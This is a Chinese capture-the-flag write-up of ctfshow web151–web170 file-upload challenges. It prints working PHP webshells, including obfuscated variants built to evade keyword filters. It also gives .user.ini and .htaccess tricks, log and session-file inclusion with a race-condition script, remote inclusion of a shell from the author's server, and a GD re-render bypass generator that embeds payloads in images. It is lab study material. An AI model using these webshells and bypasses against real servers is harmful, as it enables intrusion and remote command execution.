## web151

### 考点：前端校验

![image-20231124171819591](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231124171819591.png)

将png改成php代表接受php文件

然后上传一句话木马

## web152

### 考点：后端校验(MIME)

校验了MIME值，改成`image/png`

```
if($_FILES['file']['type'] == 'image/png')
```

## web153

### 考点：过滤php后缀名

发现upload文件夹里面有php文件，可以利用.user.ini

先上传.user.ini

```
auto_prepend_file=2.png
```

再上传2.png（内容一句话木马）

## web154，155

### 考点：过滤内容php

短标签绕过

```
<?= eval($_POST[1]);?>
```

然后同上题操作

## web156

### 考点：过滤[括号

```
if(stripos($content, "php")===FALSE && stripos($content,"[")===FALSE)
```

可以用`{}`进行代替

## web157

### `考点：过滤php、[、{、;`

```
姿势一
<?=eval(array_pop($_POST))?>
姿势二
日志包含
UA头写入一句话木马
2.png内容
<?include '/var/log/nginx/access.log'?>
```

## web158

### `考点：过滤php、[、{、;、log`

```
姿势一
<?=eval(array_pop($_POST))?>
姿势二
日志包含
UA头写入一句话木马
2.png内容
<?include '/var/l'.'og/nginx/access.l'.'og'?>
```

## web159

### `考点：过滤php、[、{、;、log、(`

```
function check($str){
    return !preg_match('/php|\{|\[|\;|log|\(/i', $str);
}
```

```
同样进行日志包含或
<?=`tac ../f*`?>
```

## web160

### `考点：过滤php、[、{、;、log、(、空格、反引号`

过滤了空格可以用换行替换

%0d换行来代替空格

```
function check($str){
    return !preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
}
```

```
2.png内容
<?include'/var/l'.'og/nginx/access.l'.'og'?>
```

![image-20231129193204434](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231129193204434.png)

## web161

### 考点：GIF89a绕过getimagesize

```
function check($str){
    return !preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
}
```

![image-20231129195851229](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231129195851229.png)

getimagesize函数，获取图片大小信息

添加文件头GIF89a可以绕过

```
//.user.ini
GIF89a
auto_prepend_file=2.png
//2.png
GIF89a
<?include'/var/l'.'og/nginx/access.l'.'og'?>
```

## web162，163

### 考点：长地址远程包含，session文件包含

```
function check($str){
    return !preg_match('/php|\{|\[|\;|log|\(| |\`|flag|\./i', $str);
}
```

姿势一：远程文件包含

条件：allow_url_include为ON

将vps的IP地址转换成长地址（不含点）

上传.user.ini

```
GIF89a
auto_prepend_file=http://长地址/🐎路径
或
上传png图片
<?include'http://长地址/🐎路径'?>
```

![image-20231129232539461](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231129232539461.png)

姿势二：

session文件包含、条件竞争 

首先上传文件.user.ini,和png

```
GIF89a
auto_prepend_file=png
png:
GIF89a
<?=include"/tmp/sess_123"?>  //123是指PHPSESSID的值
```

写脚本进行竞争

```python
import requests
import io
import threading

url = "http://052b1dd8-15ad-49c6-9ea7-61873cc8cca3.challenge.ctf.show/"
f = io.BytesIO(b'a' * 1024 * 50)
def write(session):
    while True:
        response = session.post(
            url=url,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat ../flag.php')?>"},
            cookies={"PHPSESSID":"123"},
            files={"file":("1.txt",f)}
            )

def read(session):
    while True:
        response1 = session.get(url=url+"upload")
        if 'ctfshow' in response1.text:
            print(response1.text)


if __name__ == '__main__':
    evnet = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write,args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read,args=(session,)).start()
    evnet.set()
```

session文件上传条件？为什么要竞争？

```
session.upload_progress.enabled 选项开启时（默认开启） //文件上传进度
session.upload_progress.cleanup = on
//表示当文件上传结束后，php将会立即清空对应session文件中的内容。该选项默认开启
session.auto_start：如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是默认关闭的。
```

参考链接：[浅谈 SESSION_UPLOAD_PROGRESS 的利用](https://xz.aliyun.com/t/9545#toc-1)

## web164

### 考点：png二次渲染绕过

首先上传正常的图片，下载下来与原图比较，发现内容有变化

猜测可能是图片进行了二次渲染

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
    0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'11.png'); #保存在本地的图片马
?>
```

利用脚本生成图片马

![image-20231206130828586](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231206130828586.png)

利用包含点，执行命令

```
GET:
0=system
POST:
1=cat flag.php
```

## web165

### 考点：jpg二次渲染

这题只能上传jpg图片

把上传的图片下载下来，发现图片里多了一句话

![image-20231207124057882](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231207124057882.png)

经php GD库渲染后的图片一般有如下特征字符串：

```
CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 80
```

参考：[一些CTF 做题的tricks](https://www.codenong.com/cs107071361/)

绕过脚本：

```php
<?php
$miniPayload = '<?=eval($_POST[1]);?>';
if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    die('php-gd is not installed');
}
if(!isset($argv[1])) {
    die('php jpg_payload.php <jpg_name.jpg>');
}
set_error_handler("custom_error_handler");
for($pad = 0; $pad < 1024; $pad++) {
    $nullbytePayloadSize = $pad;
    $dis = new DataInputStream($argv[1]);
    $outStream = file_get_contents($argv[1]);
    $extraBytes = 0;
    $correctImage = TRUE;
    if($dis->readShort() != 0xFFD8) {
        die('Incorrect SOI marker');
    }
    while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
        $marker = $dis->readByte();
        $size = $dis->readShort() - 2;
        $dis->skip($size);
        if($marker === 0xDA) {
            $startPos = $dis->seek();
            $outStreamTmp =
                substr($outStream, 0, $startPos) .
                $miniPayload .
                str_repeat("\0",$nullbytePayloadSize) .
                substr($outStream, $startPos);
            checkImage('_'.$argv[1], $outStreamTmp, TRUE);
            if($extraBytes !== 0) {
                while((!$dis->eof())) {
                    if($dis->readByte() === 0xFF) {
                        if($dis->readByte !== 0x00) {
                            break;
                        }
                    }
                }
                $stopPos = $dis->seek() - 2;
                $imageStreamSize = $stopPos - $startPos;
                $outStream =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    substr(
                        str_repeat("\0",$nullbytePayloadSize).
                        substr($outStream, $startPos, $imageStreamSize),
                        0,
                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                    substr($outStream, $stopPos);
            } elseif($correctImage) {
                $outStream = $outStreamTmp;
            } else {
                break;
            }
            if(checkImage('payload_'.$argv[1], $outStream)) {
                die('Success!');
            } else {
                break;
            }
        }
    }
}
unlink('payload_'.$argv[1]);
die('Something\'s wrong');
function checkImage($filename, $data, $unlink = FALSE) {
    global $correctImage;
    file_put_contents($filename, $data);
    $correctImage = TRUE;
    imagecreatefromjpeg($filename);
    if($unlink)
        unlink($filename);
    return $correctImage;
}
function custom_error_handler($errno, $errstr, $errfile, $errline) {
    global $extraBytes, $correctImage;
    $correctImage = FALSE;
    if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
        if(isset($m[1])) {
            $extraBytes = (int)$m[1];
        }
    }
}
class DataInputStream {
    private $binData;
    private $order;
    private $size;
    public function __construct($filename, $order = false, $fromString = false) {
        $this->binData = '';
        $this->order = $order;
        if(!$fromString) {
            if(!file_exists($filename) || !is_file($filename))
                die('File not exists ['.$filename.']');
            $this->binData = file_get_contents($filename);
        } else {
            $this->binData = $filename;
        }
        $this->size = strlen($this->binData);
    }
    public function seek() {
        return ($this->size - strlen($this->binData));
    }
    public function skip($skip)
    {
        $this->binData = substr($this->binData, $skip);
    }
    public function readByte() {
        if($this->eof()) {
            die('End Of File');
        }
        $byte = substr($this->binData, 0, 1);
        $this->binData = substr($this->binData, 1);
        return ord($byte);
    }

    public function readShort() {
        if(strlen($this->binData) < 2) {
            die('End Of File');
        }
        $short = substr($this->binData, 0, 2);
        $this->binData = substr($this->binData, 2);
        if($this->order) {
            $short = (ord($short[1]) << 8) + ord($short[0]);
        } else {
            $short = (ord($short[0]) << 8) + ord($short[1]);
        }
        return $short;
    }

    public function eof() {
        return !$this->binData||(strlen($this->binData) === 0);
    }
}
?>
```

使用方法：

```
命令:
php jpg_payload.php 1.jpg
注：需要用linux环境运行，我用的Ubuntu
```

## web166

只能上传zip

先找个zip，写入一句话

![image-20231207131801685](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231207131801685.png)

上传之后，抓包直接包含就行了

源码

```
if($_FILES['file']['type'] == 'application/x-zip-compressed')
if(in_array($ext_suffix, array("zip")
限制了文件类型和后缀
```

## web167

### 考点：.htaccess文件

上传Apache的分布式配置文件（.htaccess）

```
AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php
```

然后再上传.png文件的🐎

最后访问就行了

## web168

### 考点：基础免杀

上传php后缀可以上传，题目提示是免杀，那就是内容过滤了

```
function check($str){
    return preg_match('/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i', $str);
}
```

免杀

```php
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>

<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>

<?php
$a=strrev('metsys');
$a($_REQUEST[1]);
?>

<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>

<?=`$_REQUEST[1]`?>
<?php echo `$_REQUEST[1]`;?>
```

## web169

### 考点：高级免杀

```
function check($str){
    return preg_match('/eval|include|require|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\<|\>/i', $str);
}
```

日志包含

## web170

### 考点：终极免杀

```

function check($str){
    return preg_match('/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\<|\>|\(|\)|\{|\[|\}|\]|\,|\%|\`|\~|\+/i', $str);
}
```

日志包含可以绕过
